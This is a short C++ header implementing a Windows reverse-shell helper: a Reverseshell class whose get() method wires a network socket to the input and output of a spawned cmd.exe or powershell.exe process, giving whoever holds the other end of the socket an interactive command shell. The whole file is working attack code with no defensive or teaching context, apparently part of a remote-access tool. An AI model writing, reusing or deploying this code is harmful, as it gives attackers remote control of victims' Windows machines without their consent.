
#ifndef REVERSE_SHELL_LIB
#define REVERSE_SHELL_LIB

#include "windows.h"
#include "iostream"

#define WIN_CMD	0x00
#define WIN_PWS	0x02
 
class Reverseshell{
	
	public:
		HANDLE get( Socket * sock, int type );
};

HANDLE Reverseshell::get( Socket * sock, int type ){

	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	HANDLE ret;
	LPSTR exec;
	
	ret = 0;
	
	if( !sock->valid( ) )
	return 0;;
	
	memset(&si,0, sizeof(si));
	memset(&pi,0, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock->get();
	
	if( type == WIN_PWS )
	exec = (LPSTR )"powershell.exe";
	else{
		exec = (LPSTR )"cmd.exe";
	}
	
	if( CreateProcess(
		NULL,
		exec,
		NULL,
		NULL,
		true,
		0,
		NULL,
		NULL,
		&si, &pi
	) ){
		ret = pi.hProcess;
		WaitForSingleObject( pi.hProcess, INFINITE );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );
	
	}else{
		sock->Close();
	}
	
return ret;
}

#endif
